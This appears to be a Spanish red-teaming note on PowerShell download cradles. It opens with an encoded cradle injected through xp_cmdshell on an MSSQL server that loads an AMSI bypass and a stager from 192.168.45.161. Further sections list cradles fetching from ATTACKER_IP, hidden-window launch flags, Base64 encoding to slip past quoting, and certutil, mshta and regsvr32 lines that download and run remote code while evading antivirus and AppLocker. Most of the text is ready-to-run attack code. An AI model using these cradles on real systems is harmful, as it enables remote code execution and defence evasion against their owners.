---
title: Cradles
draft: false
tags:
  - red-teaming
  - payloads
  - powershell
  - download-cradle
---
 
# AMSI Bypass + Reverse Shell (vía xp_cmdshell)

Ejemplo real de cradle **codificado en Base64** inyectado a través de `xp_cmdshell` en un servidor MSSQL enlazado: carga primero el bypass de [[Antimalware Scan Interface (AMSI)|AMSI]] (`amsi.txt`) y después el stager (`run.txt`), ambos en memoria.

```powershell
$Text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/amsi.txt') | IEX; (New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/run.txt') | IEX"

$MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Text"))

$MyBase64

EXEC ('xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgAxAC8AYQBtAHMAaQAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA7ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgAxAC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'' ') AT [sql27]
```
---
# ¿Qué es un download cradle?

Un **download cradle** es una línea (normalmente de PowerShell) que descarga código desde un servidor controlado por el atacante y lo ejecuta **en memoria**, sin tocar el disco. Es la pieza que convierte una ejecución de comandos (RCE, macro, LOLBin, etc.) en la carga de un script/stager completo.

La ventaja clave frente a un [[Droppers|dropper]] clásico es que el payload nunca se escribe a disco, por lo que evita gran parte de la detección estática del AV. El precio es que el tráfico de red y la llamada a `IEX`/`AmsiScanBuffer` quedan expuestos a [[Antimalware Scan Interface (AMSI)|AMSI]] y a inspección de red, de ahí que casi siempre se combinen con un [[Bypassing AMSI With Reflection in PowerShell|bypass de AMSI]] y con [[Obfuscation|ofuscación]].

> [!INFO] Cradle vs Dropper
> - **Cradle** → descarga y ejecuta en memoria (`IEX`, `.Invoke()`, reflective load). Sin artefacto en disco.
> - **Dropper** → escribe el payload a disco y luego lo lanza (ver [[Droppers]]).

# Cradles clásicos (PowerShell)

El más común — `WebClient.DownloadString` + `IEX`:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')
# Forma abreviada:
iex(iwr -UseBasicParsing http://ATTACKER_IP/payload.ps1)
```

Variantes equivalentes (útiles cuando una está firmada/monitorizada):
```powershell
# Invoke-RestMethod
IEX (Invoke-RestMethod http://ATTACKER_IP/payload.ps1)

# DownloadData -> decodificar bytes -> IEX
$d=(New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/p.ps1');IEX([Text.Encoding]::ASCII.GetString($d))

# .NET puro sin WebClient (evita firmas sobre WebClient):
$w=[System.Net.WebRequest]::Create('http://ATTACKER_IP/p.ps1');$r=(New-Object IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();IEX $r
```

# Ejecución oculta / desde cmd

Lanzar el cradle desde un contexto no-PowerShell (macro, LOLBin, tarea) ocultando la ventana:
```cmd
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/p.ps1')"
```

| Flag | Significado |
| --- | --- |
| `-nop` | `-NoProfile` — ignora el perfil del usuario |
| `-w hidden` | `-WindowStyle Hidden` — sin ventana visible |
| `-ep bypass` | `-ExecutionPolicy Bypass` — salta la política de ejecución |
| `-e <b64>` | `-EncodedCommand` — comando en Base64 (UTF-16LE) |

# Cradle codificado en Base64

El propio comando puede codificarse para evitar comillas/caracteres especiales (p. ej. al inyectarlo desde una [[SQL Injection|SQLi]] con `xp_cmdshell` o desde una webshell). Hay que codificar en **UTF-16LE** porque es lo que espera `-EncodedCommand`:
```powershell
# Desde PowerShell:
$Text = "(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/amsi.txt') | IEX; (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/run.txt') | IEX"
$MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Text"))
$MyBase64
```
```bash
# Desde Linux (equivalente):
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/p.ps1')" | iconv -t UTF-16LE | base64 -w0
```
Y se ejecuta con:
```cmd
powershell -nop -w hidden -enc <BASE64>
```

# Cradle vía LOLBins (sin powershell.exe)

Cuando `powershell.exe` está bloqueado o muy monitorizado, se puede descargar/ejecutar con binarios legítimos del sistema. Encaja con [[Application Whitelisting]] y [[Bypassing AppLocker with PowerShell]]:
```cmd
:: certutil (muy ruidoso, pero funciona)
certutil -urlcache -split -f http://ATTACKER_IP/p.exe %TEMP%\p.exe & %TEMP%\p.exe

:: mshta (ejecuta HTA/JScript remoto)
mshta http://ATTACKER_IP/p.hta

:: regsvr32 (Squiblydoo - scriptlet remoto)
regsvr32 /s /n /u /i:http://ATTACKER_IP/p.sct scrobj.dll
```

> [!Important]
> El cradle solo descarga y ejecuta; **lo que** se ejecuta (reverse shell, stager C2, script de enumeración) se prepara aparte. Ver [[Payloads]], [[Shells]] y [[Droppers]]. Para operar con C2 ver [[Command and Control (C2-C&C)]].
